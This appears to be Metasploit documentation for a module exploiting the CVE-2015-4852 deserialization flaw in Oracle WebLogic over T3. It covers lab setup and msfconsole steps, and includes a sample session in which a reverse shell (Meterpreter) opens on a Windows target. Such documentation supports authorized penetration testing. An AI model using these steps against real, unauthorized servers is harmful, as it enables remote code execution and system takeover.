## Description
Oracle WebLogic Server v10.3.6.0, v12.1.2.0, v12.1.3.0, and v12.2.1.0 are vulnerable to a deserialization vulnerability
(CVE 2015-4852), which can be used to execute code on vulnerable systems. An unauthenticated user with network access
via T3 could exploit the vulnerability. This module has been tested against Oracle WebLogic Server v10.3.6.0 and
v12.1.3.0 running on Windows 7 x64 using JDK v7u80.

Note that successful exploitation will output the following warning to the admin server console:

```
&lt;Mar 26, 2019 4:13:24 PM CDT&gt; &lt;Error&gt; &lt;RJVM&gt; &lt;BEA-000503&gt; &lt;Incoming message header or abbreviation processing failed
java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set
java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set
        at $Proxy57.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:327)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        Truncated. see log file for complete stacktrace
```

### Setup (Windows)

Use the following steps to install a vulnerable instance of WebLogic v10.3.6.0 on a Windows 7 SP1 x64 system.

1. Install the Java SE Development Kit 7 Update 80 (64-bit version) from [Oracle][1] (use the `jdk-7u80-windows-x64.exe`
  installer). Leave all options at their default values.
1. Download "Oracle WebLogic Server 10.3.6" from their [site][2]. Select the generic installer under the "Installers
  with Oracle WebLogic Server and Oracle Coherence" section, the file is named `wls1036_generic.jar`. You may need to
  register an account.
1. From an administrative command prompt, use java to run the jar file.
    * Run: `"C:\Program Files\Java\jdk1.7.0_80\bin\java.exe" -jar wls1036_generic.jar`
1. Leave all options at their default values.
    * OPTIONAL: When prompted to register for security updates, uncheck "I wish to receive security updates via My
      Oracle Support" and confirm that you do in fact wish to remain uninformed of *critical security* issues.
    * When prompted to select the installation type, use the default "Typical" setting.
    * At the end, leave "Run Quickstart" checked and select "Done".
1. From the Quick Start menu, select "Getting started with WebLogic Server 10.3.6" to launch the configuration wizard.
1. Complete this wizard using all of the default values.
    * When prompted to enter a password, set any desired value. Knowledge of the password is not required in order to
      demonstrate this vulnerability or modify any settings in the future.
1. Start the service by navigating to the Start Menu and selecting: `All Programs > Oracle WebLogic > User Projects >
  base_domain > Start Admin Server for WebLogic`.

### Setup (Linux)

Use the following steps to install a vulnerable instance of WebLogic v10.3.6.0 in a Docker container. The same image
used to demonstrate [CVE-2017-10271][3] can be used.

1. Use git to clone the vulhub/vulhub repository from GitHub.
    * Run: `git clone https://github.com/vulhub/vulhub`
1. From within the `weblogic/CVE-2017-10271` subdirectory, use Docker to run the image.
    * Run: `docker-compose up -d`
    * TCP port 7001 should now be listening on the host machine.

## Vulnerable Application
Oracle WebLogic Server v10.3.6.0, v12.1.2.0, v12.1.3.0, and v12.2.1.0.

## Verification Steps
1. `./msfconsole -q`
2. `use exploit/multi/misc/weblogic_deserialize_rawobject`
3. `set rhosts <rhost>`
4. `set rport <srvport>`
5. `exploit`

## Scenarios
### Windows 7 x64 running Oracle WebLogic Server 10.3.6.0 and 12.1.3.0 on JDK v7u80
```
msf exploit(multi/misc/weblogic_deserialize_rawobject) > set rhost 192.168.192.6
rhost => 192.168.192.6
msf exploit(multi/misc/weblogic_deserialize_rawobject) > set rport 7001
rport => 7001
msf exploit(multi/misc/weblogic_deserialize_rawobject) > exploit

[*] Started reverse TCP handler on 192.168.192.136:4444 
[*] 192.168.192.6:7001 - Sending handshake...
[*] 192.168.192.6:7001 - Sending T3 request object...
[*] 192.168.192.6:7001 - Sending client object payload...
[*] Sending stage (179779 bytes) to 192.168.192.6
[*] Meterpreter session 7 opened (192.168.192.136:4444 -> 192.168.192.6:49266) at 2018-12-14 11:40:29 -0800

meterpreter > sysinfo
Computer        : GIOTTO-HS-W7
OS              : Windows 7 (Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
